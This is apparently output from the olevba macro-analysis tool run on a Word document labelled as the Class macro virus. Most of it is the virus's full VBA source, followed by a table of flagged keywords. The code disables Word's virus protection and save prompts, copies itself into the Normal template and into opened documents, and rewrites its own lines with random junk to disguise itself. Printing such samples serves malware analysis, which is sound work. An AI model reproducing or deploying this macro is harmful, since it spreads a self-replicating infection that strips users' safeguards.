olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab-d498cd3a1fa77fd2130ef45a8d9bb6eec1cc2448
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab-d498cd3a1fa77fd2130ef45a8d9bb6eec1cc2448 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
RG48 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.ConfirmConversions = 0
OFG = SSM + VUE
Options.VirusProtection = 0
PVF = LCV + OAM
Options.SaveNormalPrompt = 0
CCR = GBG + IGU
Application.EnableCancelKey = 0
VIG = DDO + JJP
PP86 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set CU64 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
LL21 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set CU64 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
PV81 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If PV81 <> True And LL21 <> True Then GoTo NO90
HCM = DUC + JGT
If PV81 = True Then CU64.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RG48 - 1))
QGO = FBA + HRG
If LL21 = True Then CU64.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PP86 - 1))
FKF = HAK + ETM
With CU64.CodeModule
QUH = LBN + JVC
For x = 2 To (CU64.CodeModule.CountOfLines - 1) Step 2
UNH = DKE + VCA
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
HMU = LIS + SOP
Next x
VHK = JPD + JLR
End With
LJL = FNK + OTI
NO90:
GGD = LEM + HTK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

